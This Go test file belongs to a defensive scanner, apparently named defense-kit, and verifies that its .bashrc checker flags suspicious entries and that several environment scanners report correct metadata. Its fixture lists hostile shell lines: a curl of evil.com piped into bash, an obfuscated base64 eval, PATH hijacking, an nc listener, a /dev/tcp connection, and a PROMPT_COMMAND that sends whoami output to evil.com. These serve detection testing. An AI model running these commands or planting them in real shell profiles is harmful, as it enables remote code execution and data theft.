package environment_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/environment"
)

// TestShellRCScanner_DetectsSuspiciousEntries creates a temp .bashrc with malicious
// lines and verifies that the scanner produces findings for each one.
func TestShellRCScanner_DetectsSuspiciousEntries(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")

	content := `# normal comment
export PS1="\u@\h"
curl http://evil.com/payload.sh | bash
eval $(echo aGVsbG8= | base64 -d)
export PATH=/tmp/malware:$PATH
nc -l 4444
/dev/tcp/192.168.1.1/4444
PROMPT_COMMAND="curl http://evil.com?data=$(whoami)"
`
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp .bashrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	opts := scanner.ScanOptions{
		TargetPaths: []string{dir},
	}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected findings but got none")
	}

	// Verify each finding has required fields populated.
	for _, f := range findings {
		if f.ID == "" {
			t.Error("finding has empty ID")
		}
		if f.Scanner == "" {
			t.Error("finding has empty Scanner")
		}
		if f.Evidence == "" {
			t.Error("finding has empty Evidence")
		}
		if f.Location == "" {
			t.Error("finding has empty Location")
		}
	}

	// We expect at least 6 distinct findings (one per malicious line).
	if len(findings) < 6 {
		t.Errorf("expected at least 6 findings, got %d", len(findings))
	}
}

// TestShellRCScanner_CleanFileNoFindings verifies that a clean .bashrc produces
// zero findings.
func TestShellRCScanner_CleanFileNoFindings(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")

	content := `# normal comment
export PS1="\u@\h \w $ "
alias ll='ls -la'
export EDITOR=vim
source ~/.bash_aliases
`
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp .bashrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	opts := scanner.ScanOptions{
		TargetPaths: []string{dir},
	}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean file, got %d: %+v", len(findings), findings)
	}
}

// TestShellRCScanner_Interface verifies the scanner metadata methods.
func TestShellRCScanner_Interface(t *testing.T) {
	s := environment.NewShellRCScanner()

	if s.Name() != "shell_rc" {
		t.Errorf("Name() = %q, want %q", s.Name(), "shell_rc")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestEnvVarsScanner_Interface verifies the scanner metadata methods.
func TestEnvVarsScanner_Interface(t *testing.T) {
	s := environment.NewEnvVarsScanner()

	if s.Name() != "env_vars" {
		t.Errorf("Name() = %q, want %q", s.Name(), "env_vars")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestLDPreloadScanner_Interface verifies the scanner metadata methods,
// in particular that RequiresRoot returns true.
func TestLDPreloadScanner_Interface(t *testing.T) {
	s := environment.NewLDPreloadScanner()

	if s.Name() != "ld_preload" {
		t.Errorf("Name() = %q, want %q", s.Name(), "ld_preload")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestPAMScanner_Interface verifies the scanner metadata methods,
// in particular that RequiresRoot returns true.
func TestPAMScanner_Interface(t *testing.T) {
	s := environment.NewPAMScanner()

	if s.Name() != "pam" {
		t.Errorf("Name() = %q, want %q", s.Name(), "pam")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}
